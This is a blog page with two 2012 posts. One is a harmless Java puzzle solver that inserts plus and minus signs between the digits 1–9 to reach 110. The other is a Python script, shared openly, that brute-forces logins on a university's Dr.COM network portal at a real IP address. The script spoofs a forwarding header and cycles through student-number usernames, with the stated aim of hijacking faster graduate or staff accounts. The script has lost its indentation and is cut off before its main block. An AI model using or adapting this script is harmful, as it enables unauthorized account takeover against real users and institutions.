@@ -1,0 +1,1127 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Trade Off</title>
+  <meta name="author" content="dawncold">
+
+  
+  <meta name="description" content="昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。 看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛， &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.youth2009.org/www.youth2009.org/posts/16/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Trade Off" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-8650400-5']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Trade Off</a></h1>
+  
+    <h2>supercalifragilisticexpialidocious</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="www.youth2009.org/www.youth2009.org">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/04/08/9-numbers-calculate-110/">9个数运算结果为110</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-04-08T14:20:00+08:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>2:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
+
+<p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">unittest</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">argStrings</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="kt">long</span> <span class="n">start</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">allopts</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">a</span><span class="o">,</span><span class="n">b</span><span class="o">,</span><span class="n">c</span><span class="o">,</span><span class="n">d</span><span class="o">,</span><span class="n">e</span><span class="o">,</span><span class="n">f</span><span class="o">,</span><span class="n">g</span><span class="o">,</span><span class="n">h</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">a</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">a</span><span class="o">++)</span>
+</span><span class='line'>           <span class="k">for</span><span class="o">(</span><span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">b</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">b</span><span class="o">++)</span>
+</span><span class='line'>               <span class="k">for</span><span class="o">(</span><span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">c</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">c</span><span class="o">++)</span>
+</span><span class='line'>                   <span class="k">for</span><span class="o">(</span><span class="n">d</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">d</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">d</span><span class="o">++)</span>
+</span><span class='line'>                       <span class="k">for</span><span class="o">(</span><span class="n">e</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">e</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">e</span><span class="o">++)</span>
+</span><span class='line'>                           <span class="k">for</span><span class="o">(</span><span class="n">f</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">f</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">f</span><span class="o">++)</span>
+</span><span class='line'>                               <span class="k">for</span><span class="o">(</span><span class="n">g</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">g</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">g</span><span class="o">++)</span>
+</span><span class='line'>                                   <span class="k">for</span><span class="o">(</span><span class="n">h</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span><span class="n">h</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span><span class="n">h</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>                                       <span class="n">allopts</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&quot;&quot;</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="n">e</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">h</span><span class="o">);</span>
+</span><span class='line'>                                   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">string</span> <span class="o">:</span> <span class="n">allopts</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">&quot;1x2x3x4x5x6x7x8x9&quot;</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">string</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>           <span class="o">{</span>
+</span><span class='line'>               <span class="n">String</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">getOpt</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="s">&quot;&quot;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)));</span>
+</span><span class='line'>               <span class="n">base</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;x&quot;</span><span class="o">,</span> <span class="n">tmp</span><span class="o">);</span>
+</span><span class='line'>           <span class="o">}</span>
+</span><span class='line'>           <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">getResult</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">string</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;2&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;0&quot;</span><span class="o">,</span> <span class="s">&quot;+&quot;</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&quot;1&quot;</span><span class="o">,</span> <span class="s">&quot;-&quot;</span><span class="o">));</span><span class="c1">//2-&gt;null</span>
+</span><span class='line'>           <span class="k">if</span> <span class="o">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">110</span><span class="o">)</span>
+</span><span class='line'>           <span class="o">{</span>
+</span><span class='line'>               <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+</span><span class='line'>           <span class="o">}</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;All Run Time: &quot;</span> <span class="o">+</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">start</span><span class="o">)</span> <span class="o">+</span> <span class="s">&quot;ms&quot;</span><span class="o">);</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getOpt</span><span class="o">(</span><span class="kt">int</span> <span class="n">opt</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>       <span class="n">String</span> <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">switch</span> <span class="o">(</span><span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;+&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;-&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">retString</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">default</span><span class="o">:</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">retString</span><span class="o">;</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">getResult</span><span class="o">(</span><span class="n">String</span> <span class="n">calculatString</span><span class="o">,</span> <span class="n">String</span> <span class="n">optString</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">allNum</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">allOpt</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">string</span> <span class="o">:</span> <span class="n">calculatString</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&quot;[+-]&quot;</span><span class="o">))</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="n">allNum</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">string</span><span class="o">));</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">optString</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="n">allOpt</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">optString</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">allNum</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">allNum</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="n">allOpt</span><span class="o">.</span><span class="na">size</span><span class="o">()?</span><span class="sc">&#39;+&#39;</span><span class="o">:</span><span class="n">allOpt</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">).</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>           <span class="kt">int</span> <span class="n">nextNum</span> <span class="o">=</span> <span class="n">i</span> <span class="o">==</span> <span class="n">allNum</span><span class="o">.</span><span class="na">size</span><span class="o">()?</span><span class="mi">0</span><span class="o">:</span><span class="n">allNum</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span><span class='line'>           <span class="n">result</span> <span class="o">=</span> <span class="n">getValue</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">nextNum</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">getValue</span><span class="o">(</span><span class="n">Integer</span> <span class="n">num1</span><span class="o">,</span> <span class="n">Integer</span> <span class="n">num2</span><span class="o">,</span> <span class="kt">char</span> <span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">switch</span> <span class="o">(</span><span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">ret</span> <span class="o">=</span> <span class="n">num1</span> <span class="o">+</span> <span class="n">num2</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">ret</span> <span class="o">=</span> <span class="n">num1</span> <span class="o">-</span> <span class="n">num2</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">default</span><span class="o">:</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">ret</span><span class="o">;</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>结果是这样的：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>1+2+34+5+67-8+9
+</span><span class='line'>1+234-56-78+9
+</span><span class='line'>1-2+3+45-6+78-9
+</span><span class='line'>12+3+45+67-8-9
+</span><span class='line'>12+34+56+7-8+9
+</span><span class='line'>12-3+4-5+6+7+89
+</span><span class='line'>123+4+5+67-89
+</span><span class='line'>123+4-5-6-7-8+9
+</span><span class='line'>123-4+5-6-7+8-9
+</span><span class='line'>123-4-5+6+7-8-9
+</span><span class='line'>All Run Time: 496ms
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/04/04/crack-drcom-account-in-python/">Python猜研究生账号</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-04-04T09:01:00+08:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>9:01 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#! /usr/bin python
+</span><span class='line'># encoding: utf-8
+</span><span class='line'>
+</span><span class='line'>import urllib2
+</span><span class='line'>import urllib
+</span><span class='line'>import sys
+</span><span class='line'>import types
+</span><span class='line'>
+</span><span class='line'>guess_list = []
+</span><span class='line'>server_url = "http://222.174.155.19/"
+</span><span class='line'>headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
+</span><span class='line'>'X-Forwarded-For':'1.1.1.1'}
+</span><span class='line'>
+</span><span class='line'>def usage():
+</span><span class='line'>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+</span><span class='line'>print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
+</span><span class='line'>
+</span><span class='line'>def Login(username, password):
+</span><span class='line'>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+</span><span class='line'>request = urllib2.Request(url = server_url, data = params, headers = headers)
+</span><span class='line'>try:
+</span><span class='line'>output = urllib2.urlopen(request, timeout = 3).readlines()
+</span><span class='line'>Log(output[5], username, password)
+</span><span class='line'>except:
+</span><span class='line'>print "timeout!"
+</span><span class='line'>global guess_list
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>guess_list.append(username)
+</span><span class='line'>
+</span><span class='line'>def Logout():
+</span><span class='line'>output = urllib2.urlopen(server_url + "F.htm")
+</span><span class='line'>
+</span><span class='line'>def Log(output,username, password):
+</span><span class='line'># "msga='error1'" => can not login in web
+</span><span class='line'>result = output.find("msga='error1'")
+</span><span class='line'>if result != -1:
+</span><span class='line'>print "find one!!!"
+</span><span class='line'>f = open("./content.dat", 'a')
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>f.close()
+</span><span class='line'>else:
+</span><span class='line'>print "pass!"
+</span><span class='line'>f = open("./bad.dat",'a')
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>f.close()
+</span><span class='line'>#drop first element
+</span><span class='line'>global guess_list
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>
+</span><span class='line'>def show_result():
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>print "Have Guessed:"
+</span><span class='line'>for i in open("./content.dat").readlines():
+</span><span class='line'>print i,
+</span><span class='line'>print "some accounts can not guessed are in bad.dat"
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>
+</span><span class='line'>def get_timeout_list(timeout_file_path):
+</span><span class='line'>f = open(timeout_file_path)
+</span><span class='line'>global guess_list 
+</span><span class='line'>guess_list = f.readlines()
+</span><span class='line'>f.close()
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) == 2:
+</span><span class='line'># itself and only one argv,the path of account list file...
+</span><span class='line'>get_timeout_list(sys.argv[1])
+</span><span class='line'>elif(len(sys.argv) &lt; 2):
+</span><span class='line'>usage()
+</span><span class='line'>else:
+</span><span class='line'>#start and end account,argv[1] and argv[2]
+</span><span class='line'>start = int(sys.argv[1])
+</span><span class='line'>end = int(sys.argv[2])
+</span><span class='line'>if start > end:
+</span><span class='line'>usage()
+</span><span class='line'>exit(-1)
+</span><span class='line'>else:
+</span><span class='line'>guess_list = range(start, end + 1)
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
